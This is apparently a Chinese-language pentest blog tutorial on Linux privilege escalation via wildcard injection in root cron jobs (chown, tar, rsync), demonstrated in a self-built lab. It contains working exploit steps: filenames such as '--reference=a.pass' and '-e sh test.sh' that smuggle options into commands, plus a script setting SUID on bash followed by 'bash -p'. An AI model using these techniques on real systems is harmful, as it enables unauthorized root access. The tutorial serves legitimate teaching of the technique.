---
title: "Linux提权-通配符提权"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# Linux提权-通配符提权

通配符可以帮助用户提升工作效率，本身没有安全问题，但当其与潜在危险的命令结合时，就可能导致系统安全问题

### chown+通配符劫持提权

chown是linux中用于更改文件或目录所有权的命令

当管理员通过chown加通配符的方式执行命令，渗透测试人员可以使用chown的`--reference`参数达到文件所有者劫持的效果

`--ference`参数的用法如下：

~~~cmd
--reference=<参考目录或文件>
# 更改目标文件的所有者为参考文件的所有者
~~~

接下来搭建一个场景

#### 环境配置

以root权限进行配置

在`/tmp/pass`目录下创建root.pass且权限为仅root可读：

~~~shell
echo "Admin123456" > root.pass

chmod 400 root.pass
~~~

![image-20240924105355224](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240924105356918-1087568988.png)

创建一个定时任务，原本目的为每分钟将`/tmp/pass`目录下的.pass文件所有者更改为root：

~~~crontab
* * * * * root cd /tmp/pass&&/bin/chown -R root:root *.pass
~~~

(由于是使用root权限设置的crontab，所以这里可以不注明root)

![image-20240925224100059](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240925224102394-1250089020.png)

环境配置完毕，切换用户到yuy0ung，开始利用

#### 漏洞利用

信息收集发现存在一个以root权限使用chown更改文件所有者的定时任务，且不规范的使用了通配符`*`

![image-20240925223746089](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240925223748726-1094626186.png)

根据内容发现`/tmp/pass/`目录下有个root.pass的密码文件，但没有权限读取：

![image-20240924110841359](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240924110842487-675688650.png)

这里可以尝试利用上面定时任务中不规范的命令

新建两个名为a.pass、--reference=a.pass的文件：

~~~shell
echo > a.pass&&echo >--reference=a.pass
~~~

此时，若定时任务以root权限执行`cd /tmp/pass&&/bin/chown -R root:root *.pass`，由于`*`的存在，我们新建的文件也会被带入命令，而`--reference=a.pass`文件会被当作是chown命令的参数处理，那么实际上的命令就会变成：将当前目录所有.pass文件所属组改为a.pass文件的所属组

等待定时任务执行发现root.pass的所有者变成了yuy0ung：

![image-20240924113554673](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240924113556320-662327273.png)

接下来即可直接读取root.pass文件：

![image-20240924113642142](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240924113643513-242882547.png)

### tar+通配符注入提权

tar是linux中常用的文件归档工具

在实际生产环境中，我们可能会通过定时任务使用tar去备份网站文件、日志文件

当定时任务中调用了tar且使用了通配符，可能导致权限提升

通配符注入主要在于`--checkpoint-action`和`--checkpoint`这两个参数的利用

| 参数                       | 功能                                         |
| -------------------------- | -------------------------------------------- |
| --checkpoint-action=ACTION | 每隔[NUMBER]个记录显示进度信息（默认为10个） |
| --checkpoint[=NUMBER]      | 在每个检查点上执行ACTION                     |

#### 场景复现

这个场景在云尘靶场的**linux提权系列-3**中考察了，这里直接给出我的wp作为参考：[云尘靶场-Linux提权系列WP](https://yuy0ung.github.io/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E4%BA%91%E5%B0%98%E9%9D%B6%E5%9C%BA-linux%E6%8F%90%E6%9D%83%E7%B3%BB%E5%88%97/)

### rsync+通配符注入提权

rsync是一个用于在两台计算机之间同步文件的命令行工具

同理，不合理使用`*`也可能导致权限提升

直接开始环境复现：

#### 环境搭建

root身份创建一个`/tmp/bak`

写一个定时任务：

![image-20240927222256717](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240927222257416-113972949.png)

切换到yuy0ung，开始复现

#### 漏洞复现

创建利用文件：

~~~shell
echo 'chmod 4777 /usr/bin/bash' > test.sh
# 给bash赋予suid权限，为提权做准备
~~~

![image-20240927223520957](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240927223521539-1454084710.png)

再创建一个用于注入通配符的文件：

~~~shell
echo > '-e sh test.sh'
# -e 为指定要运行的shell
~~~

![image-20240927224159421](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240927224200370-1870655255.png)

等待定时任务触发test.sh文件内容，给bash赋予suid权限：

![image-20240927224336901](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240927224337247-360825789.png)

OK了，直接提权即可：

~~~shell
bash -p
~~~

![image-20240927225115198](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240927225115763-668394798.png)

拿下root权限
